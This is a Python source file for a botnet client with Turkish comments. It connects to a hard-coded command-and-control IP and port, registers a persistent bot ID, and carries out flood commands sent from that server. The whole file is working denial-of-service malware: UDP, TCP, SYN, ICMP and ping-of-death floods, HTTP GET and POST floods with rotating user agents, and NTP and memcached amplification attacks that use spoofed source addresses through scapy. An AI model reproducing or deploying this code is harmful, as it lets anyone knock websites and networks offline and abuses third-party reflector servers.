import socket
import threading
import time
import random
import struct
import os
import sys
import ssl
import json
from uuid import uuid4
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import TCP
from icmplib import ping as pig

# C2 Sunucu Bilgileri
C2_ADDRESS  = "77.90.14.157"
C2_PORT  = 5511
BOT_ID = None

# Saldırı kontrolcüsü
attack_event = threading.Event()
attack_event.set()

# Kullanıcı ajanları
base_user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0'
]

def get_bot_id():
    config_file = 'conf.json'
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            try:
                config = json.load(f)
                return config['id']
            except (json.JSONDecodeError, KeyError):
                pass
    new_id = str(uuid4())
    with open(config_file, 'w') as f:
        json.dump({'id': new_id}, f)
    return new_id

def rand_ua():
    return random.choice(base_user_agents)

def spoofer():
    return f"{random.randint(1, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(0, 254)}"

def generate_random_headers():
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }
    header_str = ""
    for key, value in headers.items():
        if random.choice([True, False]):
            header_str += f"{key}: {value}\r\n"
    return header_str

class HttpAttackThread(threading.Thread):
    def __init__(self, target_url, secs, method, rpc):
        super().__init__()
        self.daemon = True
        self.url = target_url
        self.secs = secs
        self.method = method.upper()
        self.rpc = rpc

    def open_connection(self):
        try:
            self.parsed_url = urlparse(self.url)
            host = self.parsed_url.netloc
            port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            if self.parsed_url.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            return s
        except:
            return None

    def generate_payload(self):
        host = self.parsed_url.netloc
        path = self.parsed_url.path or "/"
        
        if self.method == 'HTTPSTRESS':
            random_data = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=512))
            json_payload = f'{{"data": "{random_data}"}}'
            content_length = len(json_payload)
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {rand_ua()}\r\n"
                f"Content-Type: application/json\r\n"
                f"X-Requested-With: XMLHttpRequest\r\n"
                f"Content-Length: {content_length}\r\n"
                f"Connection: keep-alive\r\n\r\n"
                f"{json_payload}"
            )
        else:
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {rand_ua()}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                f"{generate_random_headers()}"
                f"\r\n"
            )
        return payload.encode()

    def run(self):
        s = None
        while time.time() < self.secs and attack_event.is_set():
            try:
                if s is None:
                    s = self.open_connection()
                    if s is None:
                        time.sleep(0.1)
                        continue
                payload = self.generate_payload()
                for _ in range(self.rpc):
                    s.sendall(payload)
            except:
                if s: s.close()
                s = None
        if s: s.close()

def attack_udp(ip, port, secs, size):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dport = port or random.randint(1, 65535)
    data = random._urandom(size)
    while time.time() < secs and attack_event.is_set():
        try:
            s.sendto(data, (ip, dport))
        except:
            pass

def attack_tcp(ip, port, secs, size):
    data = random._urandom(size)
    while time.time() < secs and attack_event.is_set():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs and attack_event.is_set():
                s.sendall(data)
        except:
            pass
        finally:
            s.close()

ntp_payload = b"\x17\x00\x03\x2a" + (b"\x00" * 4)
def NTP(target, port, secs):
    try:
        if os.path.exists("ntpServers.txt"):
            with open("ntpServers.txt", "r") as f:
                ntp_servers = [line.strip() for line in f.readlines()]
            server = random.choice(ntp_servers)
            packet = IP(dst=server, src=target) / UDP(sport=random.randint(1, 65535), dport=int(port)) / Raw(load=ntp_payload)
            while time.time() < secs and attack_event.is_set():
                send(packet, verbose=False)
    except:
        pass

mem_payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, secs):
    try:
        if os.path.exists("memsv.txt"):
            with open("memsv.txt", "r") as f:
                memsv = [line.strip() for line in f.readlines()]
            server = random.choice(memsv)
            packet = IP(dst=server, src=target) / UDP(sport=port, dport=11211) / Raw(load=mem_payload)
            while time.time() < secs and attack_event.is_set():
                send(packet, verbose=False)
    except:
        pass

def icmp(target, secs):
    while time.time() < secs and attack_event.is_set():
        try:
            packet_data = random._urandom(random.randint(1024, 1400))
            pig(target, count=1, interval=0, payload_size=len(packet_data), payload=packet_data)
        except:
            pass

def pod(target, secs):
    while time.time() < secs and attack_event.is_set():
        try:
            send(IP(dst=target, ihl=random.randint(5,15), id=random.randint(1,65535)) / ICMP() / ("X"*60000), verbose=False)
        except:
            pass
            
def attack_SYN(ip, port, secs):
    while time.time() < secs and attack_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((ip, port))
        except:
            pass
        finally:
            s.close()

def main():
    global BOT_ID
    BOT_ID = get_bot_id()

    while True:
        c2 = None
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))
            
            c2.send(f'AUTH:{BOT_ID}'.encode())
            
            while True:
                data = c2.recv(2048).decode().strip()
                if not data: break
                
                args = data.split(' ')
                cmd_type = args[0].upper()
                
                target_id = None
                actual_command_args = []
                
                if cmd_type == '.CMD':
                    if len(args) < 3: continue
                    target_id = args[1]
                    if target_id != BOT_ID: continue
                    actual_command_args = args[2:]
                elif cmd_type == '.ALL':
                    if len(args) < 2: continue
                    actual_command_args = args[1:]
                else:
                    actual_command_args = args

                if not actual_command_args: continue
                
                command = actual_command_args[0].upper()

                if command == '.STOP':
                    attack_event.clear()
                    continue
                
                attack_event.set()

                if command == '.UDP':
                    ip, port, secs, size, threads = actual_command_args[1], int(actual_command_args[2]), float(actual_command_args[3]), int(actual_command_args[4]), int(actual_command_args[5])
                    for _ in range(threads): threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCP':
                    ip, port, secs, size, threads = actual_command_args[1], int(actual_command_args[2]), float(actual_command_args[3]), int(actual_command_args[4]), int(actual_command_args[5])
                    for _ in range(threads): threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.NTP':
                    ip, port, secs, threads = actual_command_args[1], int(actual_command_args[2]), float(actual_command_args[3]), int(actual_command_args[4])
                    for _ in range(threads): threading.Thread(target=NTP, args=(ip, port, secs), daemon=True).start()

                elif command == '.MEM':
                    ip, port, secs, threads = actual_command_args[1], int(actual_command_args[2]), float(actual_command_args[3]), int(actual_command_args[4])
                    for _ in range(threads): threading.Thread(target=MEM, args=(ip, port, secs), daemon=True).start()

                elif command == '.ICMP':
                    ip, secs, threads = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3])
                    for _ in range(threads): threading.Thread(target=icmp, args=(ip, secs), daemon=True).start()

                elif command == '.POD':
                    ip, secs, threads = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3])
                    for _ in range(threads): threading.Thread(target=pod, args=(ip, secs), daemon=True).start()

                elif command == '.SYN':
                    ip, port, secs, threads = actual_command_args[1], int(actual_command_args[2]), float(actual_command_args[3]), int(actual_command_args[4])
                    for _ in range(threads): threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()

                elif command == ".HTTPGET":
                    url, secs, threads = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3])
                    for _ in range(threads):
                        HttpAttackThread(target_url=url, secs=secs, method="GET", rpc=1).start()
                
                elif command == ".HTTPSTORM":
                    url, secs, threads = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3])
                    for _ in range(threads):
                        HttpAttackThread(target_url=url, secs=secs, method="HTTPSTORM", rpc=150).start()
                
                elif command == ".HTTPSPOOF":
                    url, secs, threads = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3])
                    for _ in range(threads):
                        HttpAttackThread(target_url=url, secs=secs, method="HTTPSPOOF", rpc=1).start()

                elif command == ".HTTPSTRESS":
                    url, secs, threads, rpc = actual_command_args[1], float(actual_command_args[2]), int(actual_command_args[3]), int(actual_command_args[4])
                    for _ in range(threads):
                        HttpAttackThread(target_url=url, secs=secs, method="HTTPSTRESS", rpc=rpc).start()
                
                elif command == 'PING':
                    c2.send('PONG'.encode())

        except (socket.error, ConnectionResetError, BrokenPipeError, UnicodeDecodeError):
            if c2: c2.close()
            time.sleep(5)
        except Exception:
            if c2: c2.close()
            time.sleep(5)

if __name__ == '__main__':
    main()